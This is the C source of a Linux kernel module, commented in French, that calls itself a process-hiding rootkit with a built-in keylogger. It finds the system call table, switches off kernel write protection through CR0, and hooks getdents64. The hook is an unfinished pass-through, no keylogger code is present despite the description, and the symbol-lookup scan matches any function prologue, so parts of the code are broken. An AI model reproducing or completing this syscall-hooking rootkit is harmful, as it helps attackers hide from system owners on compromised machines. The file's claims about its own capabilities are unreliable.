#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RUCKTOOA THOMAS ET Ariel Perez");
MODULE_DESCRIPTION("Rootkit qui cache les processus et keylogger intégré");

static unsigned long *syscall_table = NULL;
static unsigned long (*my_kallsyms_lookup_name)(const char *name) = NULL;

// Pointeurs pour stocker les adresses des fonctions d'origine
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent64 __user *, unsigned int);

// Déclaration de hooked_getdents
asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

// Fonction de recherche brute pour kallsyms_lookup_name
static unsigned long find_kallsyms_lookup_name_auto(void) {
    unsigned long start = 0xffffffff80000000; // Début typique de la mémoire du noyau
    unsigned long end = 0xffffffffa0000000;   // Fin typique du segment text du noyau
    unsigned char kallsyms_pattern[] = {0x55, 0x48, 0x89, 0xe5}; // Prologue typique : push rbp; mov rbp, rsp
    unsigned long *ptr;

    for (ptr = (unsigned long *)start; ptr < (unsigned long *)end; ptr++) {
        if (memcmp((void *)ptr, kallsyms_pattern, sizeof(kallsyms_pattern)) == 0) {
            printk(KERN_INFO "kallsyms_lookup_name trouvé à l'adresse : %p\n", ptr);
            return (unsigned long)ptr;
        }
    }

    printk(KERN_ALERT "kallsyms_lookup_name introuvable\n");
    return 0;
}

// Fonction de recherche brute de syscall_table
static unsigned long *find_syscall_table(void) {
    unsigned long start = 0xffffffff80000000; // Début typique de la mémoire du noyau
    unsigned long end = 0xffffffffa0000000;   // Fin typique du segment text
    unsigned long *addr;

    for (addr = (unsigned long *)start; addr < (unsigned long *)end; addr++) {
        if (addr[__NR_close] == (unsigned long)my_kallsyms_lookup_name("sys_close")) {
            return addr;
        }
    }

    printk(KERN_ALERT "syscall_table introuvable\n");
    return NULL;
}

static int __init rootkit_init(void) {
    unsigned long cr0;

    printk(KERN_INFO "Rootkit loaded\n");

    // Recherche automatique de kallsyms_lookup_name
    my_kallsyms_lookup_name = (void *)find_kallsyms_lookup_name_auto();
    if (!my_kallsyms_lookup_name) {
        printk(KERN_ALERT "kallsyms_lookup_name introuvable\n");
        return -1;
    }

    // Recherche de syscall_table
    syscall_table = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        printk(KERN_ALERT "syscall_table introuvable via kallsyms. Tentative de recherche brute.\n");
        syscall_table = find_syscall_table();
    }

    if (!syscall_table) {
        printk(KERN_ALERT "Impossible de localiser sys_call_table. Rootkit non chargé.\n");
        return -1;
    }

    // Hook de getdents64
    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000); // Désactiver la protection d'écriture
    original_getdents = (void *)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents;
    write_cr0(cr0); // Réactiver la protection d'écriture

    printk(KERN_INFO "Hook de getdents64 installé\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    unsigned long cr0;

    // Restauration de getdents64
    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000); // Désactiver la protection d'écriture
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents;
    write_cr0(cr0); // Réactiver la protection d'écriture

    printk(KERN_INFO "Rootkit déchargé\n");
}

asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
    // Implémentation de hooked_getdents
    return original_getdents(fd, dirp, count);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
